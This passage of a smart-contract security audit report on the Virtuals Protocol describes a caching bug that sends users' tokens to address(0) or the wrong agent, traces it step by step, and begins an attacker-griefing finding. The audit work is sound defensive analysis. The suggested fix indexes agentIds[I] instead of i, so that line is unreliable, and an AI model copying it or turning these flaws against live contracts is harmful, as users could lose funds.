amount)\u003c/code\u003e, losing the user’s tokens.\u003c/p\u003e\n\u003cp\u003eAdditionally, when the same \u003ccode\u003eagentId\u003c/code\u003e reoccurs after a different one, \u003ccode\u003eagentTba\u003c/code\u003e may point to the wrong address, resulting in unexpected transfers.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eConsider implementing the following version of the code:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Initialize prevAgentId to a value that no valid agentId will ever match,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// ensuring the first iteration always enters the if-block.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Initialize agentTba to a placeholder; it will be set properly on the first iteration.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elen\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Amount must be \u0026gt; 0\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Validate if amounts = 0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// If the agentId changes, fetch the corresponding agent TBA (target address)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid agent TBA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Ensure the target address is valid\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Update the cache to reflect the current agentId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einferenceCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]++;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ePrompt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epromptHashes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-3\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eAssume the following scenario. The loop processes the following values, controlled by user:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eagentIds = [0, 1, 0]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eamounts  = [10, 20, 30]\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eInitialization:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eprevAgentId = 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eagentTba = address(0)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eIteration 0:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eagentId = 0\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003eCheck: \u003ccode\u003eif (prevAgentId != agentId)\u003c/code\u003e → \u003ccode\u003eif (0 != 0)\u003c/code\u003e → FALSE\u003c/li\u003e\n\u003cli\u003eNo update to \u003ccode\u003eagentTba\u003c/code\u003e (remains \u003ccode\u003eaddress(0)\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eTransfer:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e→ User lost 10 tokens unintentionally.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eIteration 1:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eagentId = 1\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003eCheck: \u003ccode\u003eif (prevAgentId != agentId)\u003c/code\u003e → \u003ccode\u003eif (0 != 1)\u003c/code\u003e → TRUE\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eagentTba\u003c/code\u003e is updated: \u003ccode\u003eagentTba = agentNft.virtualInfo(1).tba\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e→ BUT: \u003ccode\u003eprevAgentId\u003c/code\u003e is not updated, so it still holds 0\u003c/p\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eTransfer:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagent1Tba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e→ So that’s correct.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eIteration 2:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"36\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eagentId = 0\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003eCheck: \u003ccode\u003eif (prevAgentId != agentId)\u003c/code\u003e → \u003ccode\u003eif (0 != 0)\u003c/code\u003e → FALSE\u003c/li\u003e\n\u003cli\u003eNo update to \u003ccode\u003eagentTba\u003c/code\u003e, which still holds the address for agent 1.\u003c/li\u003e\n\u003cli\u003eTransfer:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagent1Tba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e30\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e→ Tokens are sent to the wrong agent (agent 1 instead of agent 0).\u003c/p\u003e\n\u003ch3 id=\"root-cause\" style=\"position:relative;\"\u003e\u003ca href=\"#root-cause\" aria-label=\"root cause permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRoot Cause\u003c/h3\u003e\n\u003cp\u003eThe condition to fetch a new \u003ccode\u003eagentTba\u003c/code\u003e relies on \u003ccode\u003eprevAgentId\u003c/code\u003e being updated after each successful fetch.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eBecause \u003ccode\u003eprevAgentId\u003c/code\u003e is never updated inside the loop, the caching logic becomes broken:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe first transfer may lose tokens (if \u003ccode\u003eagentId == 0\u003c/code\u003e and no update is triggered),\u003c/li\u003e\n\u003cli\u003eSubsequent transfers may send tokens to incorrect agents if agentId switches back and forth.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"medium-risk-findings-26\" style=\"position:relative;\"\u003e\u003ca href=\"#medium-risk-findings-26\" aria-label=\"medium risk findings 26 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMedium Risk Findings (26)\u003c/h1\u003e\n\u003ch2 id=\"m-01-attacker-can-prevent-user-from-executing-application-registered-through-initfromtoken-in-agentfactoryv4\" style=\"position:relative;\"\u003e\u003ca href=\"#m-01-attacker-can-prevent-user-from-executing-application-registered-through-initfromtoken-in-agentfactoryv4\" aria-label=\"m 01 attacker can prevent user from executing application registered through initfromtoken in agentfactoryv4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-2\"\u003e[M-01] Attacker can prevent user from executing application registered through \u003ccode\u003einitFromToken()\u003c/code\u003e in \u003ccode\u003eAgentFactoryV4\u003c/code\u003e.\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-332\"\u003e0x04bytes\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-248\"\u003e0xShitgem\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-262\"\u003eanchabadze\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-446\"\u003elevi_104\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-489\"\u003enewspacexyz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-823\"\u003eoakcobalt\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-780\"\u003eOlugbenga\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-481\"\u003epatitonar\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-171\"\u003eRaOne\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-347\"\u003eshui\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-779\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L546\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L546\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L226\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L226\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-1\" aria-label=\"finding description 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eAgentFactoryV4\u003c/code\u003e allowed user to register agent with existing/custom agent token. The flow is divided in two 